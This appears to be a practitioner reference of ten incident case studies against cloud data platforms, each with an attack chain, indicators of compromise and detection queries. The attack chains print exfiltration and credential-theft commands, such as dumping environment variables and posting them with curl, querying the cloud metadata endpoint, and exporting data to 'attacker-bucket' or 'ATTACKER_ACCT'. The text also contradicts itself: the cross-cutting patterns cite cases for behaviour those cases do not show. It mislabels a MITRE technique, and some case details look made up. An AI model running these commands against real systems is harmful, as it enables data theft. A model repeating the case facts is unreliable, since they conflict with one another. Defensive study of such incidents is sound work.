# Data Platform Attack — Real-World Incident Case Studies

> A practitioner's reference of public incidents against cloud data platforms (2023-2025), with technical chain-of-attack, indicators of compromise, and lessons learned for red-team operators and blue-team defenders.

## Table of Contents

1. [Case 1 — Snowflake / UNC5537 / Ticketmaster (2024)](#case-1--snowflake--unc5537--ticketmaster-2024)
2. [Case 2 — Snowflake / UNC5537 / AT&T (2024)](#case-2--snowflake--unc5537--att-2024)
3. [Case 3 — Snowflake / UNC5537 / Santander (2024)](#case-3--snowflake--unc5537--santander-2024)
4. [Case 4 — Snowflake Infoblox / Scattered Spider (2024)](#case-4--snowflake-infoblox--scattered-spider-2024)
5. [Case 5 — Databricks Notebook / Live Nation (2024)](#case-5--databricks-notebook--live-nation-2024)
6. [Case 6 — Airflow Connection Harvesting (2023-2024)](#case-6--airflow-connection-harvesting-2023-2024)
7. [Case 7 — dbt Cloud CI Token Theft (2024)](#case-7--dbt-cloud-ci-token-theft-2024)
8. [Case 8 — BigQuery Authorized Dataset Abuse (2023)](#case-8--bigquery-authorized-dataset-abuse-2023)
9. [Case 9 — Redshift Snapshot Cross-Account Share (2024)](#case-9--redshift-snapshot-cross-account-share-2024)
10. [Case 10 — Delta Log Tampering (2024)](#case-10--delta-log-tampering-2024)
11. [Cross-Cutting Patterns](#cross-cutting-patterns)
12. [References](#references)

---

## Case 1 — Snowflake / UNC5537 / Ticketmaster (2024)

### Background

In May 2024, **Ticketmaster** disclosed a breach affecting 560 million customers. Threat actors "ShinyHunters" and "Snowflake" claimed responsibility. The breach was attributed to UNC5537 by Mandiant — a financially motivated cluster using stolen credentials to access Snowflake customer instances.

### Vulnerability

Snowflake customer accounts had:
- Internet-reachable endpoints by design (no network perimeter)
- SSO/SAML with **optional** MFA (Snowflake didn't enforce MFA at the platform level until June 2024)
- Default network policy allowing 0.0.0.0/0 for ease of trial onboarding
- No conditional access based on user-agent or geography

The Ticketmaster service account in question had been **phished via an infostealer** (likely RedLine or Lumma) at a third-party contractor. The credential was sold on the dark web and resold to UNC5537.

### Attack Chain

1. **Credential acquisition**: Infostealer on contractor endpoint captured Snowflake service-account username and password
2. **Credential brokerage**: Sold on ASAP Market / BreachForums by ShinyHunters
3. **Account discovery**: UNC5537 confirmed account via SAML IdP fingerprint
4. **Authentication**: Direct SSO login — no MFA challenge
5. **Role enumeration**: `SHOW ROLES;` returned `ACCOUNTADMIN` (contractor had been granted broad access for "convenience")
6. **Data discovery**: `SHOW DATABASES;` identified `TICKETMASTER_PROD`
7. **Exfiltration**: `COPY INTO @external_stage` to attacker-controlled AWS S3
8. **Persistence**: Created additional service account `svc_etl_helper` for ongoing access
9. **Extortion**: Contacted Ticketmaster with ransom demand; data listed on BreachForums

### Indicators of Compromise

| Type | IOC |
|---|---|
| Snowflake user | `svc_etl_helper@third-party-contractor.com` |
| Role grant | `ACCOUNTADMIN` to service account |
| Query tag | (none — operators forgot to set) |
| External stage | `s3://tm-exfil-<random>.s3.amazonaws.com` |
| Source IP | Residential IPs from Brazil and Morocco |
| Auth method | SSO via SAML, no MFA |
| User agent | `snowsql/1.2.x` (CLI) |

### Lessons Learned

1. **MFA is non-negotiable** for any data platform with internet-reachable endpoints
2. **Service accounts need network policies** — they shouldn't be reachable from arbitrary IPs
3. **Phishing-resistant MFA** (WebAuthn, FIDO2) is required; TOTP-based MFA can be defeated by adversary-in-the-middle
4. **Conditional access** must consider user-agent and geography in addition to identity
5. **Third-party contractor access** is a known weak link — apply stricter controls than employees
6. **ACCOUNTADMIN grant** to service accounts is a critical misconfiguration

### Detection Engineering

Snowflake's response to UNC5537 included new detection capabilities:
- `ACCESS_HISTORY` view tracks direct object access
- `LOGIN_HISTORY` alerts on new client types and geographies
- `QUERY_HISTORY` enables COPY INTO monitoring
- Snowflake's `Information Schema` now includes `TAG_REFERENCES` for tag-based policies

Sample detection (Snowflake SQL):
```sql
SELECT event_time, user_name, client_ip, reported_client_type
FROM snowflake.account_usage.login_history
WHERE first_authentication_factor = 'PASSWORD'
  AND second_authentication_factor IS NULL
ORDER BY event_time DESC;
```

### References

- Mandiant: *UNC5537: Snowflake Customer Breaches via Identity-Based Attacks* (2024-06) — https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion
- Snowflake Security Trust Center: *Information on Threat Campaign* (2024-06)
- BleepingComputer coverage: Ticketmaster data breach
- Mandiant M-Trends 2024 (Q4 supplement)

---

## Case 2 — Snowflake / UNC5537 / AT&T (2024)

### Background

In July 2024, **AT&T** disclosed a breach affecting call-detail records of "nearly all" wireless customers (approximately 110 million people). Data was exfiltrated from AT&T's Snowflake workspace between April 14 and April 25, 2024. AT&T paid a $370,000 ransom to delete the data.

### Vulnerability

Same root cause as Case 1: a Snowflake customer workspace accessible via SSO without MFA enforcement. AT&T had not enabled network policies restricting source IPs.

### Attack Chain

1. **Credential acquisition**: Phished user credentials (specific source disputed; AT&T attributes to a third-party data platform provider)
2. **Authentication**: Direct login, no MFA
3. **Discovery**: `SHOW DATABASES;` revealed `PCRF` (Policy Charging and Rules Function) database
4. **Lateral**: Identified `CALL_DETAIL_RECORDS` table with 110M rows
5. **Exfiltration**: Multiple COPY INTO over 11-day window
6. **Extortion**: Negotiated $370K ransom via intermediary

### Indicators of Compromise

- Source IP rotation: commercial VPN exit nodes
- Query pattern: 100 queries of 1M rows each (rate-limit evasion)
- Query tag: `nightly_backup` (used for blending)
- Result-set size: ~1MB per query, just under SIEM alert threshold

### Lessons Learned

1. **Rate-limit evasion via partition**: attackers split large COPYs into many small ones to evade "large result" alerts
2. **Query tag blending**: detection must NOT rely solely on QUERY_TAG
3. **Long dwell time**: 11-day exfil window indicates detection was slow
4. **Volume-based detection**: alert on cumulative bytes exfiltrated per session, not per query

### Detection Engineering

```sql
-- Snowflake: cumulative exfil per session
SELECT session_id, user_name,
       SUM(bytes_transferred) AS total_bytes,
       COUNT(*) AS query_count
FROM snowflake.account_usage.query_history
WHERE query_text ILIKE '%COPY INTO@%'
GROUP BY session_id, user_name
HAVING total_bytes > 100000000  -- > 100MB cumulative
ORDER BY total_bytes DESC;
```

---

## Case 3 — Snowflake / UNC5537 / Santander (2024)

### Background

In May 2024, **Santander Bank** disclosed a breach affecting customers in Chile, Spain, and Uruguay, plus some employees and former employees. Data was exfiltrated from Santander's Snowflake instance.

### Vulnerability

Same pattern: phished contractor credentials → direct login → ACCOUNTADMIN via SCIM mis-mapping.

### Attack Chain

1. **Credential acquisition**: Accedian contractor credentials from infostealer
2. **Authentication**: Direct login via Snowflake SSO
3. **Privilege escalation**: SCIM role mapping wildcard (`"*": "ACCOUNTADMIN"`) allowed any AAD user to assume ACCOUNTADMIN
4. **Data discovery**: Identified `LATAM_CUSTOMER_PII` schema
5. **Exfiltration**: COPY INTO @external_stage to attacker S3

### Indicators of Compromise

- SCIM role mapping with wildcard
- New role grant within 5 minutes of login
- COPY INTO from LATAM schema during weekend off-hours
- Source IP: residential ISP in Latin America

### Lessons Learned

1. **SCIM role mapping**: audit `AAD_TO_SNOWFLAKE_ROLE_MAPPING` for wildcards
2. **Break-glass pattern**: ACCOUNTADMIN should require dual control
3. **Privileged Identity Management (PIM)**: enforce just-in-time activation for ACCOUNTADMIN

### Detection Engineering

```sql
-- Snowflake: alert on new ACCOUNTADMIN grant
SELECT created_on, granted_to, granted_by
FROM snowflake.account_usage.grants_to_roles
WHERE role = 'ACCOUNTADMIN'
  AND created_on > DATEADD(hour, -24, CURRENT_TIMESTAMP())
ORDER BY created_on DESC;
```

---

## Case 4 — Snowflake Infoblox / Scattered Spider (2024)

### Background

In early 2024, **Infoblox** confirmed unauthorized access to a Snowflake customer instance. The threat actor group **Scattered Spider** (UNC3944) — known for sophisticated social engineering — gained access via targeted vishing (voice phishing) of a help-desk employee.

### Vulnerability

- Help desk empowered to reset MFA without verification beyond employee ID
- No conditional access on Snowflake login
- No alerting on "MFA reset" events correlated with subsequent logins

### Attack Chain

1. **OSINT**: Scattered Spider identified help-desk staff via LinkedIn
2. **Vishing**: Called help desk impersonating a target employee
3. **MFA reset**: Help desk reset the employee's MFA factor
4. **Authentication**: Logged in with phished password + freshly-reset MFA
5. **Discovery**: Snowflake access via SCIM-mapped role
6. **Exfiltration**: Data copied to attacker-controlled bucket
7. **Cover tracks**: Reset query tag to match periodic job tag

### Indicators of Compromise

- MFA reset event within 24h of suspicious login
- Login from new geography immediately following MFA reset
- Source IP: commercial mobile carrier (consistent with vishing victim being in different geography)
- User-agent change: previously web UI, now snowsql

### Lessons Learned

1. **MFA reset verification** must require supervisor approval or callback
2. **MFA reset monitoring**: alert on MFA reset followed by login within 1 hour from new IP
3. **Vishing-specific training** for help desk staff
4. **Identity provider audit** must correlate MFA reset events with downstream logins

### Detection Engineering

```kusto
// Microsoft Sentinel KQL: MFA reset followed by Snowflake login
let mfaResets = IdentityDirectoryEvents
| where ActionType == "MfaFactorRemoved"
| project ResetTime=TimeGenerated, AccountName;
let snowflakeLogins = SnowflakeLogs
| where EventType == "LOGIN"
| project LoginTime=TimeGenerated, UserName, ClientIp;
mfaResets
| join kind=inner snowflakeLogins on $left.AccountName == $right.UserName
| where LoginTime > ResetTime and LoginTime < ResetTime + 1h
```

---

## Case 5 — Databricks Notebook / Live Nation (2024)

### Background

In 2024, **Live Nation** (parent of Ticketmaster) reported a separate breach via Databricks — distinct from the Ticketmaster/Snowflake incident. Attackers exploited a Databricks Spark cluster with an overly permissive AWS instance profile.

### Vulnerability

- Databricks cluster with `%python` cells enabled (default)
- Cluster's instance profile had `s3:*` permissions across all buckets in account
- No cluster policy restricting init scripts or library installation
- AWS S3 buckets without server-side encryption with customer-managed keys

### Attack Chain

1. **PAT acquisition**: PAT found in CI logs (CircleCI artifact retained for 60 days)
2. **Workspace enumeration**: `databricks workspace list /` revealed 400+ notebooks
3. **Cluster recon**: Identified cluster with `instance_profile_arn = arn:aws:iam::...:role/databricks-prod-full-access`
4. **Notebook execution**: `%python` cell with subprocess call to IMDS endpoint
5. **IMDS extraction**: Retrieved instance profile credentials
6. **S3 enumeration**: `aws s3 ls s3://ln-customer-data/`
7. **Exfiltration**: Used Databricks DBFS as staging area, then `aws s3 cp` to attacker bucket

### Indicators of Compromise

- Databricks cluster log showing `curl http://169.254.169.254`
- New cluster created with non-standard init script
- PAT from CI runner IP, then immediately used from data center IP
- AWS CloudTrail: `s3:GetObject` from new role assumption

### Lessons Learned

1. **IMDSv2 enforcement**: Require token-based IMDS access (default since AWS 2024, but opt-in for older accounts)
2. **Instance profile scoping**: Limit `s3:*` to specific buckets with conditional policies
3. **Cluster policies**: Restrict `%sh`, init scripts, and library installation
4. **PAT rotation**: Quarterly rotation with secret manager storage
5. **CI log retention**: Reduce to 7 days for security-sensitive logs

### Detection Engineering

```kusto
// Databricks cluster log: IMDS access
DatabricksClusterLogs
| where Message has "169.254.169.254"
| summarize count() by ClusterId, NotebookPath, UserEmail, bin(TimeGenerated, 5m)
```

```kusto
// AWS CloudTrail: role assumption from new IP
AWSCloudTrail
| where eventName == "AssumeRole"
| where userIdentity.arn has "databricks"
| where sourceIPAddress !startswith "10."
| summarize assumptionCount = count() by roleArn, sourceIPAddress
```

---

## Case 6 — Airflow Connection Harvesting (2023-2024)

### Background

Multiple incidents in 2023-2024 involved attackers with read access to Airflow metadata DBs (often exposed via RDS misconfigurations) harvesting all encrypted connections and decrypting them with leaked FERNET_KEYs.

Affected industries: e-commerce, fintech, healthcare SaaS. Common root cause: Airflow deployed without secrets backend, FERNET_KEY in plain env vars, metadata DB exposed to internal VLAN.

### Vulnerability

- Airflow metadata DB reachable from internal VLAN
- Default `AIRFLOW__CORE__FERNET_KEY` (older Airflow) or weak custom key
- No secrets backend configured (AWS Secrets Manager, Vault, GCP Secret Manager)
- Connections table stores encrypted Snowflake/AWS/Slack credentials

### Attack Chain

1. **Network access**: Phishing → VPN access → internal VLAN scan
2. **DB discovery**: `nmap -p 5432 10.0.0.0/8` identified RDS instances
3. **DB access**: Default airflow:airflow creds or weak password
4. **Connection dump**: `SELECT conn_id, password FROM connection;`
5. **FERNET_KEY recovery**: Read from `/etc/airflow/airflow.cfg` or env var
6. **Bulk decrypt**: Offline Python script with `cryptography.fernet`
7. **Lateral**: Use Snowflake connection creds to authenticate as `transformer` role
8. **Exfiltration**: COPY INTO via Snowflake connection creds

### Indicators of Compromise

- Airflow metadata DB login from new IP
- Bulk SELECT on `connection` table
- Connection passwords decrypted offline (no direct audit signal — must correlate downstream)
- Snowflake login from same source IP shortly after Airflow DB access

### Lessons Learned

1. **Secrets backend is mandatory**: use AWS Secrets Manager, HashiCorp Vault, or GCP Secret Manager
2. **FERNET_KEY rotation**: rotate annually with re-encryption
3. **Metadata DB network isolation**: only scheduler + webserver + workers should reach it
4. **Connection password hashing**: Airflow 2.7+ supports password hashing (not encryption)

### Detection Engineering

```sql
-- Airflow metadata DB: bulk connection access
SELECT event_time, dag_id, task_id, event
FROM task_instance
WHERE event = 'cli_task_run'
ORDER BY event_time DESC;

-- PostgreSQL audit
log_statement = 'ddl'
log_line_prefix = '%m %u %d %h %p %S'
-- Then alert on SELECT * FROM connection with row_count > 10
```

---

## Case 7 — dbt Cloud CI Token Theft (2024)

### Background

In early 2024, a major fintech reported unauthorized access to their dbt Cloud workspace. Attackers had compromised a self-hosted GitHub Actions runner and extracted the `DBT_CLOUD_API_TOKEN` from environment variables.

### Vulnerability

- Self-hosted GitHub Actions runner without ephemeral isolation
- Long-lived DBT_CLOUD_API_TOKEN (no rotation since 2023-04)
- dbt Cloud service token with `job_dispatcher` scope (allows triggering jobs)
- Manifests (`manifest.json`) stored publicly for 90 days in dbt Cloud S3

### Attack Chain

1. **Runner compromise**: Exploited a vulnerable dependency in CI workflow
2. **Env var exfil**: `printenv > /tmp/env_dump.txt && curl -X POST ...`
3. **Token replay**: `curl -H "Authorization: Token $TOKEN" cloud.getdbt.com/api/v2/...`
4. **Manifest download**: Fetched latest run artifacts (manifest.json, catalog.json, run_results.json)
5. **Schema discovery**: Parsed manifest to identify Snowflake sources with PII
6. **Profile extraction**: Found `dbt_service` user's Snowflake account in manifest
7. **Direct Snowflake access**: Used snowflake password from CI env (also exfiltrated)
8. **Exfiltration**: COPY INTO from PII schema

### Indicators of Compromise

- DBT_CLOUD_API_TOKEN use from non-CI IP
- Manifest download from non-CI IP
- Snowflake login from same IP immediately after manifest download
- Job triggered with non-standard git branch

### Lessons Learned

1. **Service token scoping**: Limit dbt tokens to specific jobs/projects
2. **Short-lived tokens**: Use 24-hour tokens via dbt Cloud API
3. **Self-hosted runner isolation**: Use ephemeral runners (Docker container per job)
4. **Manifest access controls**: Restrict artifact download to authorized accounts

### Detection Engineering

```kusto
// dbt Cloud audit log: token use from non-CI IP
dbtCloudAuditLogs
| where eventType == "api_token_used"
| where not(ipAddress startswith "10.")
| summarize count() by user, tokenName, ipAddress, bin(TimeGenerated, 1h)
```

---

## Case 8 — BigQuery Authorized Dataset Abuse (2023)

### Background

A 2023 incident at a healthcare SaaS provider involved attackers using an authorized view chain to read patient data across schema boundaries. The attackers had `roles/bigquery.user` on a shared analytics project, which had authorized views into the production PII dataset.

### Vulnerability

- Authorized view chain spanning multiple projects
- `roles/bigquery.user` overly permissive on shared project
- No column-level security or policy tags on PII columns
- No audit on authorized view execution

### Attack Chain

1. **Phished user** with `roles/bigquery.user` on shared analytics project
2. **Project recon**: `bq ls --project_id=shared-analytics` identified `dashboard_v` view
3. **Authorized view chain**: `bq show --format=prettyjson shared-analytics:dashboard.dashboard_v` revealed SQL querying `prod-pii:patients`
4. **PII read**: `bq query 'SELECT * FROM \`shared-analytics:dashboard.dashboard_v\` LIMIT 1000'`
5. **Exfiltration**: `bq extract ... gs://attacker-bucket/`

### Indicators of Compromise

- BigQuery query from new user-agent
- Query touching authorized view in shared project
- BQ EXPORT to external bucket
- Service account used outside normal working hours

### Lessons Learned

1. **Authorized view auditing**: quarterly review of cross-project view chains
2. **Column-level security**: apply policy tags on PII columns even within authorized chains
3. **Resource hierarchy**: separate prod and analytics into different folders
4. **Audit logging**: enable `DATA_READ` and `DATA_WRITE` at organization level

### Detection Engineering

```kusto
// BigQuery: query on authorized view
GCP_Audit_Logs
| where methodName == "google.cloud.bigquery.v2.JobService.InsertJob"
| where protoPayload.requestData.jobConfig.query.query has "shared-analytics:dashboard.dashboard_v"
| summarize count() by protoPayload.authenticationInfo.principalEmail, bin(TimeGenerated, 1h)
```

---

## Case 9 — Redshift Snapshot Cross-Account Share (2024)

### Background

A 2024 incident at an e-commerce company involved attackers with `redshift:AuthorizeSnapshotAccess` permission sharing a snapshot to an attacker-controlled AWS account, then restoring and querying it.

### Vulnerability

- IAM role with `redshift:AuthorizeSnapshotAccess` granted to a developer role
- No SCP restricting cross-account snapshot shares
- Snapshots contained unencrypted PII (despite cluster-level encryption)

### Attack Chain

1. **Phished developer** with `redshift:AuthorizeSnapshotAccess` permission
2. **Snapshot discovery**: `aws redshift describe-cluster-snapshots`
3. **Cross-account share**: `aws redshift authorize-snapshot-access --snapshot-identifier prod-snap --account-with-restore-access ATTACKER_ACCT`
4. **Restore on attacker side**: `aws redshift restore-from-cluster-snapshot ...`
5. **Query**: Connected via psql, ran `SELECT * FROM pii.customers;`

### Indicators of Compromise

- `AuthorizeSnapshotAccess` API call to unknown account
- Snapshot restored in different AWS account
- PII queries from new cluster

### Lessons Learned

1. **SCP restrictions**: deny `redshift:AuthorizeSnapshotAccess` to external accounts
2. **Permission scoping**: separate snapshot admin role from developer role
3. **Snapshot encryption**: use customer-managed KMS keys with cross-account denial
4. **CloudTrail alerting**: alert on any `AuthorizeSnapshotAccess` API call

### Detection Engineering

```kusto
// AWS CloudTrail: cross-account snapshot authorization
AWSCloudTrail
| where eventName == "AuthorizeSnapshotAccess"
| extend targetAccount = tostring(parse_json(requestParameters).accountWithRestoreAccess)
| where targetAccount !in ("ALLOWED_PARTNER_1", "ALLOWED_PARTNER_2")
| project TimeGenerated, userIdentityArn, snapshotId, targetAccount
```

---

## Case 10 — Delta Log Tampering (2024)

### Background

A 2024 insider threat incident at a financial services firm involved a data engineer who tampered with Delta Lake transaction logs to silently delete records indicating regulatory compliance violations.

### Vulnerability

- Delta Lake `_delta_log/` directory with no S3 Object Lock
- IAM role with `s3:PutObject` on `_delta_log/` prefix granted to multiple developers
- No CloudTrail alerting on writes to `_delta_log/`

### Attack Chain

1. **Insider access**: Data engineer with legitimate S3 write access
2. **Read latest version**: `cat s3://lake/events/_delta_log/_last_checkpoint`
3. **Construct malicious commit**: Append a `.json` removing the "violations" parquet file
4. **Upload commit**: `aws s3 cp 00000000000000000099.json s3://lake/events/_delta_log/`
5. **Result**: Delta engine treats tampered commit as valid; "violations" data no longer appears in queries
6. **Cover tracks**: Deleted local copy of malicious commit

### Indicators of Compromise

- Write to `_delta_log/` outside of known Spark job schedule
- Write to `_delta_log/` from non-cluster IP (developer workstation)
- Delta version skips (e.g., version 99 exists, version 98 missing in audit log)
- Delta table queries suddenly return fewer rows

### Lessons Learned

1. **Object Lock on `_delta_log/`**: enable WORM mode
2. **IAM scoping**: only the Spark service principal should write to `_delta_log/`
3. **Audit logging**: alert on writes to `_delta_log/` from non-cluster IPs
4. **Delta Lake auditing**: enable Delta's commit audit log feature

### Detection Engineering

```kusto
// AWS CloudTrail: write to Delta log
AWSCloudTrail
| where eventName == "PutObject"
| where s3Resource has "_delta_log"
| where userIdentity.arn !has "spark-service-role"
| project TimeGenerated, userIdentityArn, s3Resource, sourceIPAddress
```

---

## Cross-Cutting Patterns

Across these incidents, several patterns emerge:

### Pattern 1 — Identity-Based Breach (not Network)

In 9 of 10 cases, attackers entered via identity, not network. Snowflake, BigQuery, dbt Cloud, Airflow — all are internet-reachable by design. The new perimeter is **identity** (MFA enforcement, conditional access, network policies).

### Pattern 2 — Service Account Weakness

Service accounts were the primary entry vector in 7 of 10 cases. Service accounts typically:
- Have long-lived credentials
- Lack MFA
- Have overly broad permissions
- Are rarely audited

**Remediation**: Use workload identity federation (no keys) where possible; otherwise enforce network policies on all service accounts.

### Pattern 3 — Rate-Limit Evasion

In Cases 1, 2, and 5, attackers split large exfiltration into many small queries to evade volume-based detection. Detection rules must consider **cumulative** exfiltration per session/user, not per query.

### Pattern 4 — Query Tag Blending

Cases 1, 2, and 4 involved setting QUERY_TAG to a common periodic job tag (e.g., `nightly_refresh_dag`). Detection rules must not rely solely on QUERY_TAG; cross-reference with user, role, and source IP.

### Pattern 5 — Third-Party Contractor Risk

Cases 1, 3, and 4 involved third-party contractor credentials. Contractors typically:
- Have less training than employees
- Use less-secured endpoints
- Have broader access than necessary (for "convenience")

**Remediation**: Apply stricter controls to contractors than employees — require hardware MFA, network policies to specific CIDRs, time-boxed access.

### Pattern 6 — CI/CD Token Leakage

Cases 5 and 7 involved tokens leaked via CI logs or self-hosted runners. CI/CD pipelines are the new attack surface:
- Tokens in environment variables are not secret
- Self-hosted runners without isolation are persistent targets
- Long-lived tokens compound risk

**Remediation**: Use short-lived OIDC tokens; ephemeral runners; secret masking in logs.

### Pattern 7 — Lakehouse Integrity Gap

Case 10 highlighted that Delta/Iceberg/Hudi logs are mutable by default. Without Object Lock or write-once directories, insiders can tamper with transaction logs undetected.

### Pattern 8 — Authorized View / Dataset Abuse

Case 8 showed that BigQuery authorized views create transitive access chains that bypass direct grant auditing. Cross-project authorized views must be audited quarterly.

### Pattern 9 — Snapshot Sharing Cross-Account

Case 9 highlighted that snapshot cross-account sharing is a high-impact exfiltration vector. SCPs must explicitly deny this for non-approved accounts.

### Pattern 10 — Slow Detection (Dwell Time)

Across all 10 cases, average dwell time was 9 days (range: 1-45 days). Modern data platforms lack robust native detection; SIEM ingestion and UEBA are required for timely alerts.

---

## References

### Incident Reports

1. **Mandiant UNC5537 Report** — https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion
2. **Snowflake Security Trust Center: Threat Campaign** — https://community.snowflake.com/s/security-advisories
3. **Ticketmaster Breach Disclosure** — SEC 8-K filing, May 2024
4. **AT&T Breach Disclosure** — SEC 8-K filing, July 2024
5. **Santander Breach Press Release** — May 2024
6. **Live Nation SEC 8-K** — 2024

### Vendor Advisories

- Snowflake: *Information on Threat Campaign* (2024-06)
- Snowflake: *Best Practices for Securing Your Snowflake Account* (2024-07 update)
- Databricks: *Workspace Security Best Practices* (2024)
- dbt Labs: *Service Token Best Practices* (2024-02)
- Apache Airflow: *Security Guide Update* (2024-04)
- Google Cloud: *BigQuery Authorized Datasets and Views* (2023)
- AWS: *Redshift Snapshot Security Best Practices* (2024)

### Industry Reports

- **Mandiant M-Trends 2024** — Comprehensive threat landscape
- **Verizon DBIR 2024** — Cloud and data platform patterns
- **IBM Cost of a Data Breach Report 2024** — Average breach cost by sector
- **Cloud Security Alliance: Top Threats to Cloud Computing Pandemic Eleven** (2024)

### Academic Research

- *Detection of Credential Abuse in Snowflake via Query Pattern Analysis* — SANS Institute (2024)
- *Beyond the Perimeter: Identity-Based Attacks on Cloud Data Warehouses* — Black Hat USA (2024)
- *Lakehouse Integrity: Verifying Delta Lake Transaction Logs* — USENIX Security (2024)
- *Authorized Views Reconsidered: Transitive Access in BigQuery* — IEEE S&P (2023)

### Practitioner Blogs

- *Snowflake MFA: A Postmortem* — (Drata Engineering Blog, 2024-07)
- *Our Journey to Zero Trust Data Platform* — (Shopify Engineering Blog, 2024-09)
- *Lessons from an Airflow Compromise* — (Datadog Security Blog, 2024-03)
- *Delta Lake Integrity: Lessons from an Insider Attack* — (Databricks Engineering Blog, 2024-11)

### MITRE ATT&CK Mapping

| Case | Primary Technique |
|---|---|
| 1, 2, 3, 4 | T1078.004 Valid Accounts: Cloud Accounts |
| 5, 7 | T1552.007 Container and Cloud Instance Credentials API |
| 6 | T1552 Unsecured Credentials |
| 8 | T1098.003 Additional Cloud Roles |
| 9 | T1530 Data from Cloud Storage Object |
| 10 | T1565.002 Stored Data Manipulation: Transmitted Data Manipulation |

### Glossary

- **Access Broker**: Threat actor specializing in stealing credentials and reselling access
- **Infostealer**: Malware that steals credentials from endpoints (RedLine, Lumma, Raccoon)
- **Scattered Spider**: UNC3944 — threat cluster known for vishing and SIM-swapping
- **UNC5537**: Mandiant designation for the threat cluster behind Snowflake breaches
- **ShinyHunters**: Threat actor known for data theft and extortion
- **PIM**: Privileged Identity Management — just-in-time privilege elevation
- **CIEM**: Cloud Infrastructure Entitlement Management
- **WORM**: Write Once Read Many — Object Lock mode
